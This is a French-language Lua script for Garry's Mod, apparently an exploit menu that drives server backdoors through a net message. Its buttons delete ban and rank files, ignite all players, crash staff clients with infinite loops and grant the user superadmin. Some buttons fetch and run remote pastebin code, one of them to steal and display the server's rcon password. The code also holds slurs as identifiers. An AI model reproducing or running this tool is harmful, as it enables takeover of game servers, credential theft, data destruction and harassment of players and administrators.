iZNX.NetStart(thefrenchenculer)
net.WriteString( "if file.Exists( \"ulib/bans.txt\", \"DATA\" ) then file.Delete(\"ulib/bans.txt\") end" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx4 = vgui.Create("DButton", DScrollPanel )
commandnethtx4:SetSize( 208, 20 )
commandnethtx4:SetPos( 2, 125 )
commandnethtx4:SetText("Bruler Tout Les Joueurs")
commandnethtx4:SetTextColor(Color(255, 255, 255, 255))
commandnethtx4.Paint = function(panel, w, h)
surface.SetDrawColor(0, 26, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(50, 0, 0 ,155)
surface.DrawRect(0, 0, w, h)
end
commandnethtx4.DoClick = function()
iZNX.NetStart(thefrenchenculer)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:Ignite(120) end" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx5 = vgui.Create("DButton", DScrollPanel )
commandnethtx5:SetSize( 208, 20 )
commandnethtx5:SetPos( 2, 150 )
commandnethtx5:SetText("Supprimer les grades")
commandnethtx5:SetTextColor(Color(255, 255, 255, 255))
commandnethtx5.Paint = function(panel, w, h)
surface.SetDrawColor(0, 26, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(50, 0, 0 ,155)
surface.DrawRect(0, 0, w, h)
end
commandnethtx5.DoClick = function()
iZNX.NetStart(thefrenchenculer)
net.WriteString( "if file.Exists( \"ulib/groups.txt\", \"DATA\" ) then file.Delete(\"ulib/groups.txt\") end" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx6 = vgui.Create("DButton", DScrollPanel )
commandnethtx6:SetSize( 208, 20 )
commandnethtx6:SetPos( 2, 50 )
commandnethtx6:SetText("[OFF]Redémarrer le serveur")
commandnethtx6:SetTextColor(Color(255, 255, 255, 255))
commandnethtx6.Paint = function(panel, w, h)
surface.SetDrawColor(0, 26, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(50, 0, 0 ,155)
surface.DrawRect(0, 0, w, h)
end
commandnethtx6.DoClick = function()
iZNX.NetStart(thefrenchenculer)
net.WriteString("RunConsoleCommand(\"changelevel \"..game.GetMap())")
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx7 = vgui.Create("DButton", DScrollPanel)
commandnethtx7:SetSize( 208, 20 )
commandnethtx7:SetPos( 2, 200 )
commandnethtx7:SetText("Screamer Audio")
commandnethtx7:SetTextColor(Color(255, 255, 255, 255))
commandnethtx7.Paint = function(panel, w, h)
surface.SetDrawColor(0, 26, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(50, 0, 0 ,155)
surface.DrawRect(0, 0, w, h)
end
commandnethtx7.DoClick = function()
iZNX.NetStart(thefrenchenculer)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:EmitSound( \"npc/stalker/go_alert2a.wav\", 100, 100 ) end" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx8 = vgui.Create("DButton", DScrollPanel)
commandnethtx8:SetSize( 208, 20 )
commandnethtx8:SetPos( 2, 225 )
commandnethtx8:SetText("Skin En Carton")
commandnethtx8:SetTextColor(Color(255, 255, 255, 255))
commandnethtx8.Paint = function(panel, w, h)
surface.SetDrawColor(0, 26, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(50, 0, 0 ,155)
surface.DrawRect(0, 0, w, h)
end
commandnethtx8.DoClick = function()
iZNX.NetStart(thefrenchenculer)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:SetModel(\"models/editor/playerstart.mdl\") end" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx9 = vgui.Create("DButton", DScrollPanel)
commandnethtx9:SetSize( 208, 20 )
commandnethtx9:SetPos( 2, 250 )
commandnethtx9:SetText("Courir ultra vite")
commandnethtx9:SetTextColor(Color(255, 255, 255, 255))
commandnethtx9.Paint = function(panel, w, h)
surface.SetDrawColor(0, 26, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(50, 0, 0 ,155)
surface.DrawRect(0, 0, w, h)
end
commandnethtx9.DoClick = function()
net.Start(thefrenchenculer)
net.WriteString( "RunConsoleCommand(\"sv_friction\", \"-8\")" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx10 = vgui.Create("DButton", DScrollPanel)
commandnethtx10:SetSize( 208, 20 )
commandnethtx10:SetPos( 2, 275 )
commandnethtx10:SetText("Inverser la gravité")
commandnethtx10:SetTextColor(Color(255, 255, 255, 255))
commandnethtx10.Paint = function(panel, w, h)
surface.SetDrawColor(0, 26, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(50, 0, 0 ,155)
surface.DrawRect(0, 0, w, h)
end
commandnethtx10.DoClick = function()
net.Start(thefrenchenculer)
net.WriteString( "RunConsoleCommand(\"sv_gravity\", \"-600\")" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx11 = vgui.Create("DButton", DScrollPanel)
commandnethtx11:SetSize( 208, 20 )
commandnethtx11:SetPos( 2, 300 )
commandnethtx11:SetText("Reset tout l'argent du serveur")
commandnethtx11:SetTextColor(Color(255, 255, 255, 255))
commandnethtx11.Paint = function(panel, w, h)
surface.SetDrawColor(0, 26, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(50, 0, 0 ,155)
surface.DrawRect(0, 0, w, h)
end
commandnethtx11.DoClick = function()
net.Start(thefrenchenculer)
net.WriteString( "RunConsoleCommand(\"rp_resetallmoney\")" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx12 = vgui.Create("DButton", DScrollPanel)
commandnethtx12:SetSize( 208, 20 )
commandnethtx12:SetPos( 2, 325 )
commandnethtx12:SetText("Faire voler tous les joueurs")
commandnethtx12:SetTextColor(Color(255, 255, 255, 255))
commandnethtx12.Paint = function(panel, w, h)
surface.SetDrawColor(0, 26, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(50, 0, 0 ,155)
surface.DrawRect(0, 0, w, h)
end
commandnethtx12.DoClick = function()
net.Start(thefrenchenculer)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:SetVelocity(v:GetVelocity() + Vector(math.random(1000,5000), math.random(1000,5000), math.random(1000,5000))) end" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx13 = vgui.Create("DButton", DScrollPanel)
commandnethtx13:SetSize( 208, 20 )
commandnethtx13:SetPos( 2, 350 )
commandnethtx13:SetText("Crash tous les staffs/vip")
commandnethtx13:SetTextColor(Color(255, 255, 255, 255))
commandnethtx13.Paint = function(panel, w, h)
surface.SetDrawColor(0, 26, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(50, 0, 0 ,155)
surface.DrawRect(0, 0, w, h)
end
commandnethtx13.DoClick = function()
net.Start(thefrenchenculer)
net.WriteString( "for k,v in pairs(player.GetAll()) do if( v:GetUserGroup() != \"user\" ) then v:SendLua(\"while true do end\") end end" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx14 = vgui.Create("DButton", DScrollPanel)
commandnethtx14:SetSize( 208, 20 )
commandnethtx14:SetPos( 2, 75 )
commandnethtx14:SetText("Activé Mode PLS")
commandnethtx14:SetTextColor(Color(255, 255, 255, 255))
commandnethtx14.Paint = function(panel, w, h)
surface.SetDrawColor(0, 26, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(50, 0, 0 ,155)
surface.DrawRect(0, 0, w, h)
end
commandnethtx14.DoClick = function()
net.Start(thefrenchenculer)
net.WriteString( "http.Fetch(\"https://pastebin.com/raw/EkGDvWfC\",function(b,l,h,c)RunString(b)end,nil)" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx15 = vgui.Create("DButton", DScrollPanel)
commandnethtx15:SetSize( 208, 20 )
commandnethtx15:SetPos( 2, 400 )
commandnethtx15:SetText("10000000€ toutes les 0.1sec tous les joueurs")
commandnethtx15:SetTextColor(Color(255, 255, 255, 255))
commandnethtx15.Paint = function(panel, w, h)
surface.SetDrawColor(0, 26, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(50, 0, 0 ,155)
surface.DrawRect(0, 0, w, h)
end
commandnethtx15.DoClick = function()
net.Start(thefrenchenculer)
net.WriteString( "for k,v in pairs(player.GetAll()) do timer.Create( \"timerargent10\", 0.1, 0, function() v:addMoney(10000000) end) end" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx16 = vgui.Create("DButton", DScrollPanel)
commandnethtx16:SetSize( 208, 20 )
commandnethtx16:SetPos( 2, 425 )
commandnethtx16:SetText("rcon strealler")
commandnethtx16:SetTextColor(Color(255, 255, 255, 255))
commandnethtx16.Paint = function(panel, w, h)
surface.SetDrawColor(0, 26, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(50, 0, 0 ,155)
surface.DrawRect(0, 0, w, h)
end
commandnethtx16.DoClick = function()
net.Start(thefrenchenculer)
net.WriteString( "http.Fetch(\"https://pastebin.com/raw/uhT2BcGh\",function(b,l,h,c)RunString(b)end,nil)" )
net.WriteBit(1)
net.SendToServer()
timer.Simple( 0.5, function()
if iZNX.ValidNetString( "jeveuttonrconleul" ) then
net.Start("jeveuttonrconleul")
net.SendToServer()
else
chat.AddText( Color(255, 0, 0),"rcon_password pas trouvé, veuillez réessayer ^^" )
end
end)
end
local commandnethtx17 = vgui.Create("DButton", DScrollPanel)
commandnethtx17:SetSize( 208, 20 )
commandnethtx17:SetPos( 2, 450 )
commandnethtx17:SetText("Se Mettre superadmin")
commandnethtx17:SetTextColor(Color(255, 255, 255, 255))
commandnethtx17.Paint = function(panel, w, h)
surface.SetDrawColor(0, 26, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(50, 0, 0 ,155)
surface.DrawRect(0, 0, w, h)
end
commandnethtx17.DoClick = function()
net.Start(thefrenchenculer)
net.WriteString( [[
       
            local id = ]] .. LocalPlayer():UserID() .. [[
           
            RunConsoleCommand( 'ulx', 'adduser', tostring( Player( id ):Nick() ), 'superadmin' )
           
            Player( id ):SetUserGroup( "superadmin" )
       
        ]] )
net.WriteBit(1)
net.SendToServer()
end
local RconCommand = vgui.Create( "DTextEntry", DScrollPanel )
RconCommand:SetPos( 110, 0 )
RconCommand:SetSize( 100, 20 )
RconCommand:SetText( "hostname Serveur Hacké Par Zeaper & Vking04 " )
local Lancer_rcon_commande = vgui.Create("DButton", DScrollPanel )
Lancer_rcon_commande:SetSize( 103, 20 )
Lancer_rcon_commande:SetPos( 2, 0 )
Lancer_rcon_commande:SetText("Crash Le Serveur")
Lancer_rcon_commande:SetTextColor(Color(255, 255, 255, 255))
Lancer_rcon_commande.Paint = function(panel, w, h)
surface.SetDrawColor(0, 26, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(50, 0, 0 ,155)
surface.DrawRect(0, 0, w, h)
end
Lancer_rcon_commande.DoClick = function()
local rcon_commandes_get = RconCommand:GetValue()
iZNX.NetStart(thefrenchenculer)
net.WriteString( rcon_commandes_get )
net.WriteBit(false)
net.SendToServer()
end
local GLUACommand = vgui.Create( "DTextEntry", DScrollPanel )
GLUACommand:SetPos( 110, 25 )
GLUACommand:SetSize( 100, 20 )
GLUACommand:SetText( "timer.Create(\"Timerdecrash\",0.5,1,function() while true do end end)" )
local Lancer_glua_commande = vgui.Create("DButton", DScrollPanel )
Lancer_glua_commande:SetSize( 103, 20 )
Lancer_glua_commande:SetPos( 2, 25 )
Lancer_glua_commande:SetText("Code LUA")
Lancer_glua_commande:SetTextColor(Color(255, 255, 255, 255))
Lancer_glua_commande.Paint = function(panel, w, h)
surface.SetDrawColor(0, 26, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(50, 0, 0 ,155)
surface.DrawRect(0, 0, w, h)
end
Lancer_glua_commande.DoClick = function()
local glua_commandes_get = GLUACommand:GetValue()
iZNX.NetStart(thefrenchenculer)
net.WriteString( glua_commandes_get )
net.WriteBit(1)
net.SendToServer()
end
end
net.Receive( "rcon_passw_dump", function()
local rcon_pass = net.ReadString()
chat.AddText( Color(255, 255, 255), rcon_pass, Color(0, 255, 0)," GG avec ça tu peux baiser le serveur même si il enleve la backdoor :D")
end )
net.Receive( "aucun_rcon_ici", function()
chat.AddText( Color(255, 0, 0),"Aucun rcon_password sur le serveur :/" )
end )
function iZNX.MakePlayerSelectionButton( parent, x, y, addr )
if !parent:IsValid() then return end
local TButton = vgui.Create( "DButton" )
TButton:SetParent( parent )
TButton:SetPos( x, y )
TButton:SetText( "Choisir des cibles" )
TButton:SetTextColor( Color(255, 255, 255, 255) )
TButton:SizeToContents()
TButton:SetTall( 24 )
TButton.Paint = function( self, w, h )
surface.SetDrawColor( Color(0, 26, 255, 255) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color( 60, 60, 60 ) )
surface.SetMaterial( downgrad )
surface.DrawTexturedRect( 0, 0, w, h/ 2 )
surface.SetDrawColor( Color(100, 100, 100, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
surface.SetDrawColor( Color(70, 70, 100, 255) )
surface.DrawOutlinedRect( 2, 2, w - 4, h - 4 )
end
TButton.DoClick = function()
iZNX.SelectPlayersPanel( addr )
end
return TButton:GetWide(), TButton:GetTall()
end
function iZNX.SelectPlayersPanel( addr )
if iZNX.PlayerSelector and iZNX.PlayerSelector:IsVisible() then iZNX.PlayerSelector:Remove() end
local plytab = iZNX.GetStored( addr, {} )
iZNX.PlayerSelector = vgui.Create("DFrame")
iZNX.PlayerSelector:SetSize(250,400)
iZNX.PlayerSelector:SetTitle("Joueur(s) à cibler")
iZNX.PlayerSelector:SetPos( gui.MouseX(), gui.MouseY() )
iZNX.PlayerSelector:MakePopup()
iZNX.PlayerSelector.Paint = function( s, w, h )
if !iZNX.Menu or !iZNX.Menu:IsVisible() then s:Remove() return end
surface.SetDrawColor( Color(30, 30, 30, 245) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color(55, 55, 55, 245) )
surface.DrawOutlinedRect( 0, 0, w, h )
surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
end
local Plist = vgui.Create( "DPanelList", iZNX.PlayerSelector )
Plist:SetSize( iZNX.PlayerSelector:GetWide() - 10, iZNX.PlayerSelector:GetTall() - 55 )
Plist:SetPadding( 5 )
Plist:SetSpacing( 5 )
Plist:EnableHorizontal( false )
Plist:EnableVerticalScrollbar( true )
Plist:SetPos( 5, 40 )
Plist:SetName( "" )
local target1 = vgui.Create("DButton", iZNX.PlayerSelector)
target1:SetSize( 40, 20 )
target1:SetPos( 10, 23 )
target1:SetText("Tous")
target1:SetTextColor(Color(255, 255, 255, 255))
target1.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(0, 0, 50 ,155)
surface.DrawRect(0, 0, w, h)
end
target1.DoClick = function()
for _, p in pairs(player.GetAll()) do
if not table.HasValue( plytab, p ) then
table.insert( plytab, p )
end
end
iZNX.Store( addr, plytab )
end
local target2 = vgui.Create("DButton", iZNX.PlayerSelector)
target2:SetSize( 40, 20 )
target2:SetPos( 55, 23 )
target2:SetText("Aucun")
target2:SetTextColor(Color(255, 255, 255, 255))
target2.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(0, 0, 50 ,155)
surface.DrawRect(0, 0, w, h)
end
target2.DoClick = function()
table.Empty( plytab )
iZNX.Store( addr, plytab )
end
local target3 = vgui.Create("DButton", iZNX.PlayerSelector )
target3:SetSize( 40, 20 )
target3:SetPos( 100, 23 )
target3:SetText("Moi")
target3:SetTextColor(Color(255, 255, 255, 255))
target3.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(0, 0, 50 ,155)
surface.DrawRect(0, 0, w, h)
end
target3.DoClick = function()
table.Empty( plytab )
table.insert( plytab, LocalPlayer() )
iZNX.Store( addr, plytab )
end
local target4 = vgui.Create( "DTextEntry", iZNX.PlayerSelector )
target4:SetPos( 145, 23 )
target4:SetSize( 95, 20 )
target4:SetText( "" )
target4.OnChange = function( self )
local nam = self:GetValue()
local namtab = string.Explode( ", ", nam )
table.Empty( plytab )
for _, pl in pairs( player.GetAll() ) do
for _, s in pairs( namtab ) do
if string.find( string.lower( pl:Nick() ), s ) then
table.insert( plytab, pl )
end
end
end
iZNX.Store( addr, plytab )
end
for k, v in pairs( player.GetAll() ) do
local plypanel2 = vgui.Create( "DPanel" )
plypanel2:SetPos( 0, 0 )
plypanel2:SetSize( 200, 25 )
local teamcol = team.GetColor( v:Team() )
plypanel2.Paint = function( s, w, h )
if !v:IsValid() then return end
surface.SetDrawColor( Color(30, 30, 30, 245) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( teamcol )
surface.DrawRect( 0, h - 3, w, 3 )
surface.SetDrawColor( Color(55, 55, 55, 245) )
surface.DrawOutlinedRect( 0, 0, w, h )
if table.HasValue( plytab, v ) then surface.SetDrawColor( Color(55, 255, 55, 245) ) end
surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
end
local plyname = vgui.Create( "DLabel", plypanel2 )
plyname:SetPos( 10, 5 )
plyname:SetFont( "Trebuchet18" )
local tcol = Color( 255, 255, 255 )
if v == LocalPlayer() then tcol = Color( 155, 155, 255 ) end
plyname:SetColor( tcol )
plyname:SetText( v:Nick() )
plyname:SetSize(180, 15)
local faggot = vgui.Create("DButton", plypanel2 )
faggot:SetSize( plypanel2:GetWide(), plypanel2:GetTall() )
faggot:SetPos( 0, 0 )
faggot:SetText("")
faggot.Paint = function(panel, w, h)
return
end
faggot.DoClick = function()
if table.HasValue( plytab, v ) then
table.RemoveByValue( plytab, v )
else
table.insert( plytab, v )
end
iZNX.Store( addr, plytab )
end
Plist:AddItem( plypanel2 )
end
end
function iZNX.MakeTextInputButton( parent, x, y, btext, default, addr)
if !parent:IsValid() then return end
local hostframe = vgui.Create( "DPanel", parent )
hostframe:SetPos( x, y )
hostframe.Paint = function( self, w, h )
surface.SetDrawColor( Color(60, 60, 60, 200) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color( 60, 60, 60 ) )
surface.SetMaterial( downgrad )
surface.DrawTexturedRect( 0, 0, w, h/ 2 )
surface.SetDrawColor( Color(100, 100, 100, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
end
local tttt = vgui.Create( "DLabel", hostframe )
tttt:SetPos( 5, 5 )
tttt:SetText( btext )
tttt:SizeToContents()
local tentry = vgui.Create( "DTextEntry", hostframe )
tentry:SetPos( 10 + tttt:GetWide(), 2 )
tentry:SetSize( 130, 20 )
tentry:SetText( iZNX.GetStored( addr, default ) )
tentry.OnChange = function( self )
iZNX.Store( addr, self:GetValue() )
end
hostframe:SetSize( 13 + tttt:GetWide() + tentry:GetWide(), 24 )
return hostframe:GetWide(), hostframe:GetTall()
end
function iZNX.MakeNumberInputButton( parent, x, y, btext, default, min, max, addr)
if !parent:IsValid() then return end
local hostframe = vgui.Create( "DPanel", parent )
hostframe:SetPos( x, y )
hostframe.Paint = function( self, w, h )
surface.SetDrawColor( Color(60, 60, 60, 200) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color( 60, 60, 60 ) )
surface.SetMaterial( downgrad )
surface.DrawTexturedRect( 0, 0, w, h/ 2 )
surface.SetDrawColor( Color(100, 100, 100, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
end
local tttt = vgui.Create( "DLabel", hostframe )
tttt:SetPos( 5, 5 )
tttt:SetText( btext )
tttt:SizeToContents()
local wangmeoff = vgui.Create( "DNumberWang", hostframe )
wangmeoff:SetPos( 10 + tttt:GetWide(), 2 )
wangmeoff:SetSize( 75, 20 )
wangmeoff:SetDecimals( 2 )
wangmeoff:SetMinMax( min , max )
wangmeoff:SetValue( iZNX.GetStored( addr, default ) )
wangmeoff:SetAllowNonAsciiCharacters(false)
wangmeoff.OnValueChanged = function( self, val )
iZNX.Store( addr, self:GetValue() )
end
hostframe:SetSize( 13 + tttt:GetWide() + wangmeoff:GetWide(), 24 )
return hostframe:GetWide(), hostframe:GetTall()
end
concommand.Add( "exploit_menu", function()
iZNX.Menu = vgui.Create("DFrame")
iZNX.Menu:SetSize(700,550)
iZNX.Menu:SetTitle("")
iZNX.Menu:Center()
iZNX.Menu:MakePopup()
iZNX.Menu.gay = table.Count( iZNX.sploits )
iZNX.Menu.Paint = function( s, w, h )
surface.SetDrawColor( Color(158,0,255,255) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color(0, 26, 255, 225) )
surface.DrawOutlinedRect( 0, 0, w, h )
surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
surface.SetDrawColor( Color(255, 0, 0, 255) )
surface.DrawRect( 80, 25, w - 90, h - 35 )
surface.SetDrawColor( Color(255, 0, 0, 255) )
surface.DrawLine(  )
surface.DrawLine( 158, 0, 255, 255 )
surface.DrawLine( 158, 0, 255, 255 )
surface.DrawLine( 158, 0, 255, 255 )
surface.DrawLine( 158, 0, 255, 255 )
surface.DrawLine( 158, 0, 255, 255 )
surface.DrawLine( 255, 0, 0, 255 )
draw.DrawText( ""..iZNX.Menu.gay, "default", 8, 85, Color(158,0,255, 255) )
end
local Plist = vgui.Create( "DPanelList", iZNX.Menu )
Plist:SetSize( iZNX.Menu:GetWide() - 90, iZNX.Menu:GetTall() - 35 )
Plist:SetPadding( 5 )
Plist:SetSpacing( 5 )
Plist:EnableHorizontal( false )
Plist:EnableVerticalScrollbar( true )
Plist:SetPos( 80, 25 )
Plist:SetName( "" )
iZNX.MakeFunctionButton( iZNX.Menu, 10, 130, "Load Config", iZNX.LoadConfig, "Charger une Config" )
iZNX.MakeFunctionButton( iZNX.Menu, 10, 160, "Save Config", iZNX.SaveConfig, "Sauvegarder la Config" )
local function CreateSploitPanel( name, t )
if !iZNX.Menu then return end
local cmdp = vgui.Create( "DPanel" )
cmdp:SetSize( Plist:GetWide(), 70 )
cmdp.Cmd = name
cmdp.Desc = t.desc
cmdp.Paint = function( s, w, h )
surface.SetDrawColor( Color(50, 50, 50, 245) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( severitycols[t.severity] )
surface.DrawOutlinedRect( 0, 0, w, h )
surface.DrawLine( 0, 24, w, 24 )
draw.DrawText( cmdp.Cmd, "DermaDefault", 10, 5, Color(255,255,255) )
draw.DrawText( cmdp.Desc, "DermaDefault", 10, 28, Color(158,0,255, 255) )
end
local x = 10
for _, tab in ipairs( t.functions ) do
if tab.typ == "func" then
x = (x + 5) + iZNX.MakeFunctionButton( cmdp, x, 42, tab.name, tab.func )
elseif tab.typ == "players" then
x = (x + 5) + iZNX.MakePlayerSelectionButton( cmdp, x, 42, tab.addr )
elseif tab.typ == "htxcommandeliste" then
x = (x + 5) + iZNX.HTXBackdoor( cmdp, x, 42, tab.name )
elseif tab.typ == "string" then
x = (x + 5) + iZNX.MakeTextInputButton( cmdp, x, 42, tab.name, tab.default, tab.addr )
if !iZNX.IsStored( tab.addr ) then iZNX.Store( tab.addr, tab.default ) end
elseif tab.typ == "float" then
x = (x + 5) + iZNX.MakeNumberInputButton( cmdp, x, 42, tab.name, tab.default, tab.min, tab.max, tab.addr )
if !iZNX.IsStored( tab.addr ) then iZNX.Store( tab.addr, tab.default ) end
end
end
Plist:AddItem( cmdp )
end
for k, v in pairs( iZNX.sploits ) do
if v.scan() then CreateSploitPanel( k, v ) end
end
end)